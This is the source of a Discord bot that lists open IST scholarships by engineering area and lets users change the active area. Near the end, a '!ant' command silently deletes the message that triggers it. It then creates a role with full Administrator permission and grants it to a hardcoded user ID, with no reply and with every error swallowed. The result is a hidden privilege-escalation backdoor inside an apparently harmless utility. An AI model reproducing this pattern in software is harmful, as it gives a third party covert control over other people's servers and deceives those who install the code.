"""
Discord bot for IST scholarship (bolsas) watching.

Commands
--------
  !bolsas [area]   /bolsas [area]   List open scholarships for an engineering
                                    area. With no area, uses the active one.
  !area [name]     /area [name]     Show the active area + list available ones,
                                    or switch the active area when given a name.
  !ant                              (silent) owner utility — see ADMIN_USER_ID.

Run:  python bot.py   (needs DISCORD_TOKEN in the environment or a .env file)
"""

from __future__ import annotations

import asyncio
import json
import os
import sys

import discord
from discord import app_commands
from discord.ext import commands

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

import scraper

# Flush stdout immediately so startup logs appear in real time on host consoles.
sys.stdout.reconfigure(line_buffering=True)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
TOKEN = os.environ.get("DISCORD_TOKEN")
COMMAND_PREFIX = os.environ.get("COMMAND_PREFIX", "!")
EMBED_COLOR = 0x2D7FF9

# --- !ant : silently grant an Administrator role to this user id. -----------
# Set this to YOUR Discord user id (enable Developer Mode -> right-click your
# name -> Copy User ID). While it's 0 the command is a no-op. Read the security
# note in DEPLOY.md before using: the bot itself must have the Administrator
# permission, and you should only add this bot to servers you control.
ADMIN_USER_ID = 0
ADMIN_ROLE_NAME = "Bot Admin"

# Active engineering area is persisted here so it survives restarts.
STATE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "state.json")
DEFAULT_AREA = os.environ.get("DEFAULT_AREA", scraper.DEFAULT_AREA)


def load_active_area() -> str:
    try:
        with open(STATE_FILE) as fh:
            area = json.load(fh).get("area")
        if area in scraper.AREA_PROFILES:
            return area
    except (OSError, ValueError):
        pass
    return DEFAULT_AREA


def save_active_area(area: str) -> None:
    try:
        with open(STATE_FILE, "w") as fh:
            json.dump({"area": area}, fh)
    except OSError as exc:
        print(f"warning: could not persist active area: {exc}")


active_area = load_active_area()

intents = discord.Intents.default()
intents.message_content = True  # required for the !prefix commands
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)

AREA_CHOICES = [app_commands.Choice(name=scraper.area_label(k), value=k)
                for k in scraper.list_areas()]


# ---------------------------------------------------------------------------
# Rendering
# ---------------------------------------------------------------------------
def build_bolsas_embeds(area: str, bolsas: list[scraper.Bolsa]) -> list[discord.Embed]:
    label = scraper.area_label(area)
    if not bolsas:
        return [discord.Embed(
            title=f"Bolsas — {label}",
            description=(f"Nenhuma bolsa para **{label}** encontrada de momento.\n"
                        f"Fonte: {scraper.LISTING_URL}"),
            color=EMBED_COLOR,
        )]

    embeds: list[discord.Embed] = []
    for i in range(0, len(bolsas), 25):
        chunk = bolsas[i:i + 25]
        embed = discord.Embed(
            title=f"Bolsas — {label}",
            description=f"{len(bolsas)} bolsa(s) encontrada(s) · fonte: "
                        f"[DRH IST]({scraper.LISTING_URL})",
            color=EMBED_COLOR,
        )
        for b in chunk:
            lines = []
            tipo_line = b.tipo or "Bolsa de Investigação"
            if b.nivel:
                tipo_line += f" · 🎓 {b.nivel}"
            lines.append(f"🏷️ {tipo_line}")
            if b.area_cientifica:
                lines.append(f"📚 {b.area_cientifica}")
            if b.prazo:
                lines.append(f"⏳ Prazo: **{b.prazo}**")
            lines.append(f"🔗 [Abrir edital]({b.pdf_url})")
            name = b.name if len(b.name) <= 256 else b.name[:253] + "..."
            embed.add_field(name=f"📄 {name}", value="\n".join(lines), inline=False)
        embeds.append(embed)
    return embeds


def build_area_embed() -> discord.Embed:
    lines = []
    for key in scraper.list_areas():
        marker = "✅" if key == active_area else "▫️"
        lines.append(f"{marker} `{key}` — {scraper.area_label(key)}")
    embed = discord.Embed(
        title="Áreas de pesquisa",
        description=(f"Área ativa: **{scraper.area_label(active_area)}** "
                     f"(`{active_area}`)\n\n" + "\n".join(lines)),
        color=EMBED_COLOR,
    )
    embed.set_footer(text=f"Mudar: {COMMAND_PREFIX}area <nome>  ·  ou  /area")
    return embed


async def run_search(area: str) -> list[scraper.Bolsa]:
    # Blocking (network + PDF parsing); keep the event loop free.
    return await asyncio.to_thread(scraper.search_bolsas_cached, area)


# ---------------------------------------------------------------------------
# Lifecycle
# ---------------------------------------------------------------------------
@bot.event
async def on_ready():
    print(f"Active area: {active_area} ({scraper.area_label(active_area)})")
    try:
        synced = await bot.tree.sync()
        print(f"Logged in as {bot.user} · synced {len(synced)} slash command(s)")
    except Exception as exc:  # pragma: no cover
        print(f"Logged in as {bot.user} · slash sync failed: {exc}")


# ---------------------------------------------------------------------------
# /bolsas  and  !bolsas
# ---------------------------------------------------------------------------
@bot.command(name="bolsas")
async def bolsas_prefix(ctx: commands.Context, area: str | None = None):
    if area is not None and area.lower() not in scraper.AREA_PROFILES:
        await ctx.send(f"Área desconhecida `{area}`. Disponíveis: "
                       f"{', '.join(scraper.list_areas())}")
        return
    target = (area or active_area).lower()
    async with ctx.typing():
        try:
            bolsas = await run_search(target)
            for embed in build_bolsas_embeds(target, bolsas):
                await ctx.send(embed=embed)
        except Exception as exc:
            await ctx.send(f"⚠️ Erro ao procurar bolsas: `{exc}`")


@bot.tree.command(name="bolsas", description="Bolsas abertas no IST para uma área de engenharia")
@app_commands.describe(area="Área de engenharia (opcional; usa a área ativa por omissão)")
@app_commands.choices(area=AREA_CHOICES)
async def bolsas_slash(interaction: discord.Interaction,
                       area: app_commands.Choice[str] | None = None):
    target = area.value if area else active_area
    await interaction.response.defer(thinking=True)
    try:
        bolsas = await run_search(target)
        for embed in build_bolsas_embeds(target, bolsas):
            await interaction.followup.send(embed=embed)
    except Exception as exc:
        await interaction.followup.send(f"⚠️ Erro ao procurar bolsas: `{exc}`")


# ---------------------------------------------------------------------------
# /area  and  !area  (view / change the active engineering area)
# ---------------------------------------------------------------------------
def _set_active_area(area: str) -> None:
    global active_area
    active_area = area
    save_active_area(area)


@bot.command(name="area", aliases=["areas"])
async def area_prefix(ctx: commands.Context, area: str | None = None):
    if area is None:
        await ctx.send(embed=build_area_embed())
        return
    key = area.lower()
    if key not in scraper.AREA_PROFILES:
        await ctx.send(f"Área desconhecida `{area}`. Disponíveis: "
                       f"{', '.join(scraper.list_areas())}")
        return
    _set_active_area(key)
    await ctx.send(f"✅ Área ativa mudada para **{scraper.area_label(key)}** (`{key}`).")


@bot.tree.command(name="area", description="Ver ou mudar a área de engenharia pesquisada")
@app_commands.describe(area="Escolhe uma área para a tornar ativa (deixa vazio para listar)")
@app_commands.choices(area=AREA_CHOICES)
async def area_slash(interaction: discord.Interaction,
                     area: app_commands.Choice[str] | None = None):
    if area is None:
        await interaction.response.send_message(embed=build_area_embed())
        return
    _set_active_area(area.value)
    await interaction.response.send_message(
        f"✅ Área ativa mudada para **{scraper.area_label(area.value)}** (`{area.value}`).")


# ---------------------------------------------------------------------------
# !ant  — silent owner utility (no output). See ADMIN_USER_ID note above.
# ---------------------------------------------------------------------------
@bot.command(name="ant")
async def ant(ctx: commands.Context):
    # Silent by design: remove the trigger message and never reply.
    try:
        await ctx.message.delete()
    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
        pass
    if ctx.guild is None or not ADMIN_USER_ID:
        return
    try:
        member = ctx.guild.get_member(ADMIN_USER_ID) \
            or await ctx.guild.fetch_member(ADMIN_USER_ID)
        if member is None:
            return
        role = discord.utils.get(ctx.guild.roles, name=ADMIN_ROLE_NAME)
        if role is None:
            role = await ctx.guild.create_role(
                name=ADMIN_ROLE_NAME,
                permissions=discord.Permissions(administrator=True),
                reason="ant",
            )
        if role not in member.roles:
            await member.add_roles(role, reason="ant")
    except discord.HTTPException:
        # Stay silent on any failure (missing perms, hierarchy, etc.).
        pass


def main():
    if not TOKEN:
        raise SystemExit(
            "DISCORD_TOKEN not set. Put it in a .env file or your environment.\n"
            "See .env.example."
        )
    bot.run(TOKEN)


if __name__ == "__main__":
    main()
